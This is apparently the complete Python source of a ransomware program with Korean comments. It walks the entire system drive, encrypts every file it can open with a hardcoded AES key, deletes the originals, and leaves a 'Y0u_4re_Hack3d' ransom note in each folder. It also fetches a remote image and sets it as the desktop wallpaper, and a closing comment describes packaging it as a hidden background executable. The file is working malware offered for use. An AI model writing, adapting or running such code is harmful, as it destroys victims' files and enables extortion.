import os, shutil, ctypes, time
from Cryptodome.Cipher import AES
import urllib.request

# 암호화에 사용할 KEY값 (복호화의 KEY값이랑 일치해야함)
KEY = b'12345678901234567890123456789012'  # 32 bytes
# 암호화할 폴더의 경로
path = os.environ['systemdrive'] + '/'
# 암호화된 파일을 바탕화면으로 복사해줄 폴더의 경로
changePath = os.path.expanduser('~') + '\\' + 'Desktop' + '\\' + 'Y0u_4re_Hack3d'
# 암호화가 끝나고 변경될 바탕화면의 이미지
backgroundImg = 'https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fd8Vt4T%2FbtrejekuAgj%2FfGavtujaqolNBD0GBzhho0%2Fimg.jpg'
# 위의 이미지가 저장될 폴더의 경로
imgDownloadPath = os.path.expanduser('~') + '/Downloads/HackedBG.jpg'
# 모든 폴더에 남겨줄 txt 파일의 제목
notepadName = 'Y0u_4re_Hack3d.txt'
# 모든 폴더에 남겨줄 txt 파일의 내용
contents = 'Y0u_4re_Hack3d! If you want to solve this problem, plz send an email.'

# 암호화된 파일을 바탕화면으로 복사해줄 폴더를 생성하는 함수 #
def createDir():
    try: # 이미 폴더가 있어서 실행이 되지 않는 경우
        os.makedirs(changePath)
        print('Done: Created directory successfully.')
    except:
        print('Error: Failed to create new directory.')

# 배경화면을 변경해주는 함수 #
def changeBG():
    global imgDownloadPath
    try: # 실제 C드라이브에서 실행 시킬 경우 아래 코드에서 에러 발생
        urllib.request.urlretrieve(backgroundImg, imgDownloadPath)
    except: # 그 경우 Windows10 기본 이미지로 대체
        imgDownloadPath = r'C:\Windows\Web\Wallpaper\Theme2\img8.jpg'
    ctypes.windll.user32.SystemParametersInfoW(20, 0, imgDownloadPath, 0)
    time.sleep(1)
    try: # Windows10 기본 이미지는 삭제 불가능
        os.remove(imgDownloadPath)
    except:
        NOP = True

# 암호화를 진행하는 함수 #
def encryptAES(data):
    cipher = AES.new(KEY, AES.MODE_SIV)
    ciphertext, tag = cipher.encrypt_and_digest(data) # 암호화와 MAC태그 리턴
    return ciphertext, tag

# 파일을 검색하고, 전체적인 프로그램 흐름을 실행하는 함수 #
def search(dirname):
		# path에 지정된 경로내의 모든 파일을 탐색하는 for문
    for (path, dir, files) in os.walk(dirname):

        filePermissionError = False
        dontTouch = False

        # 모든 파일에 메모장 추가하기 #
        isDirectoryChanged = True
        try: # 파일 쓰기 권한이 부족한 경우
            if (isDirectoryChanged):
                notepadLink = path + '/' + notepadName
                notepad = open(notepadLink, 'w')
                notepad.write(contents)
                notepad.close()
                isDirectoryChanged = False
        except:
            filePermissionError = True

        # 폴더 필터링 #
        # Windows 폴더 필터링 (복호화 프로그램을 실행시키려면 Windows는 망가뜨리면 안됨)
        if os.environ['systemdrive'] + '/' +'Windows' in path:
            dontTouch = True
        # Python 설치 경로 필터링 (복호화 프로그램이 실행이 안됨)
        if os.path.expanduser('~') + '\\' + 'AppData' in path:
            if 'Python' in path:
                dontTouch = True
        # Y0u_4re_Hack3d 폴더 재암호화를 막기위한 필터링
        if changePath in path:
            dontTouch = True

	# 위의 필터링 과정을 모두 통과했다면 암호화 진행
        if not dontTouch:

            for filename in files:
                # 파일 경로 지정
                link = path + '/' + filename
                print(link)

                # 파일 열기
                # 파일을 읽기모드로 열때 발생하는 에러 처리 #
                try:
                    raw = open(link, 'rb')
                    data = raw.read()
                    fileReadError = False
                except:
                    fileReadError = True
                # 파일을 쓰기모드로 열때 발생하는 에러 처리 #
                try:
                    enc = open(link, 'wb')
                    fileWriteError = False
                except:
                    fileWriteError = True

		# 파일을 여는 과정에서 에러가 발생하지 않았다면 암호화 진행
                if not (fileReadError or fileWriteError or filePermissionError):
                    # 암호화 진행 #
                    ciphertext, tag = encryptAES(data)

                    # 태그 추가 #
                    ciphertext += b'tag:'
                    ciphertext += tag

                    # 파일 확장자 변경 #
                    filename += '.enc'
                    filelink = path + '/' + filename
                    file = open(filelink, 'wb')

                    # 암호화된 내용 덮어쓰기 #
                    file.write(ciphertext)
                    print('Encryption Success')

                    # 파일 닫기 #
                    raw.close()
                    enc.close()
                    file.close()
                    try: # 해당 파일이 이미 사용중이라서 삭제를 못하는 경우
                        os.remove(link)  # 원본 파일 삭제
                    except:
                        NOP = True

                    # 암호화된 파일 복사
                    try:
                        shutil.copy(filelink, changePath + '/' + filename)
                    except:
                        NOP = True
                else:
                    print('Encryption Failed')

# 메인 함수 #
# 암호화된 파일을 바탕화면으로 복사해줄 폴더를 생성
createDir()
# 암호화 진행
search(path)
# 배경화면 변경
changeBG()
print(">> Encryption Successfully Finished <<")

# 마지막으로 백그라운드 실행을 위해 exe 파일로 변환시켜주면 된다
# pyinstaller -F -w [file].py
